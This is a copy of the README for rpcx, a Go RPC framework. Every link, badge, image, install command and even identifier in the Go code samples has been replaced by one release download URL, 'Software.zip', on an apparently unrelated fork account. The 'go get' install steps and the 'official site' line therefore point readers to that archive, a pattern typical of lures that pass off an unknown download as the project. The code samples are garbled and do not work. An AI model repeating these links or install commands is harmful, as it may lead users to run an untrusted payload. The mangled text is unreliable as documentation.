<a href="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"><img height="160" src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></a>

Official site: [https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)

[![License](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip%https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) [![GoDoc](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)  [![travis](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) [![Go Report Card](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) [![coveralls](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) [![QQ2群](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip群https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) [![QQ群(已满)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip群(已满)https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) 

## Announce

A tcpdump-like tool added: [rpcxdump](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)。 You can use it to debug communications between rpcx services and clients.

![](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)


## Cross-Languages
you can use other programming languages besides Go to access rpcx services.

- **rpcx-gateway**: You can write clients in any programming languages to call rpcx services via [rpcx-gateway](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)
- **http invoke**: you can use the same http requests to access rpcx gateway
- **Java Services/Clients**: You can use [rpcx-java](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) to implement/access rpcx servies via raw protocol.


> If you can write Go methods, you can also write rpc services. It is so easy to write rpc applications with rpcx.

## Installation

install the basic features:

`go get -u -v https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip`


If you want to use `reuseport`、`quic`、`kcp`, `zookeeper`, `etcd`, `consul`, `redis` registry, use those tags to `go get` 、 `go build` or `go run`. For example, if you want to use all features, you can:

```sh
go get -u -v -tags "reuseport quic kcp zookeeper etcd consul redis ping utp" https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip
```

**_tags_**:
- **quic**: support quic transport
- **kcp**: support kcp transport
- **zookeeper**: support zookeeper registry
- **etcd**: support etcd registry
- **consul**: support consul registry
- **redis**: support consul registry
- **ping**: support network quality load balancing
- **reuseport**: support reuseport
- **utp**: support utp transport

## Features
rpcx is a RPC framework like [Alibaba Dubbo](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) and [Weibo Motan](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).

**rpcx 3.0** has been refactored for targets:
1. **Simple**: easy to learn, easy to develop, easy to intergate and easy to deploy
2. **Performance**: high perforamnce (>= grpc-go)
3. **Cross-platform**: support _raw slice of bytes_, _JSON_, _Protobuf_ and _MessagePack_. Theoretically it can be used with java, php, python, c/c++, https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip, c# and other platforms
4. **Service discovery and service governance**: support zookeeper, etcd and consul.


It contains below features
- Support raw Go functions. There's no need to define proto files.
- Pluggable. Features can be extended such as service discovery, tracing.
- Support TCP, HTTP, [QUIC](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) and [KCP](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)
- Support multiple codecs such as JSON, Protobuf, [MessagePack](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) and raw bytes.
- Service discovery. Support peer2peer, configured peers, [zookeeper](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip), [etcd](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip), [consul](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) and [mDNS](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).
- Fault tolerance：Failover, Failfast, Failtry.
- Load banlancing：support Random, RoundRobin, Consistent hashing, Weighted, network quality and Geography.
- Support Compression.
- Support passing metadata.
- Support Authorization.
- Support heartbeat and one-way request.
- Other features: metrics, log, timeout, alias, circuit breaker.
- Support bidirectional communication.
- Support access via HTTP so you can write clients in any programming languages.
- Support API gateway.
- Support backup request, forking and broadcast.


rpcx uses a binary protocol and platform-independent, which means you can develop services in other languages such as Java, python, nodejs, and you can use other prorgramming languages to invoke services developed in Go.

There is a UI manager: [rpcx-ui](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).

## Performance

Test results show rpcx has better performance than other rpc framework except standard rpc lib.


The benchmark code is at [rpcx-benchmark](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).

**Listen to others, but test by yourself**.

**_Test Environment_**

- **CPU**: Intel(R) Xeon(R) CPU E5-2630 v3 @ 2.40GHz, 32 cores
- **Memory**: 32G
- **Go**: 1.9.0
- **OS**: CentOS 7 / https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip

**_Use_**
- protobuf
- the client and the server on the same server
- 581 bytes payload
- 500/2000/5000 concurrent clients
- mock processing time: 0ms, 10ms and 30ms

**_Test Result_**

### mock 0ms process time

<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td></tr></table>


### mock 10ms process time

<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td></tr></table>


### mock 30ms process time

<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td></tr></table>


## Examples

You can find all examples at [rpcx-ecosystem/rpcx-examples3](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).

The below is a simple example.


**Server**

```go
    // define https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip
    ……

    s := https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip()
	https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip("Arith", new(https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip), "")
	https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip("tcp", addr)

```


**Client**

```go
    // prepare requests
    ……

    d := https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip("tcp@"+addr, "")
	xclient := https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip("Arith", https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip, https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip, d, https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)
	defer https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip()
	err := https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip(), "Mul", args, reply, nil)
```

## Contribute

see [contributors](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).

Welcome to contribute:
- submit issues or requirements
- send PRs
- write projects to use rpcx
- write tutorials or articles to introduce rpcx

## License

Apache License, Version 2.0 
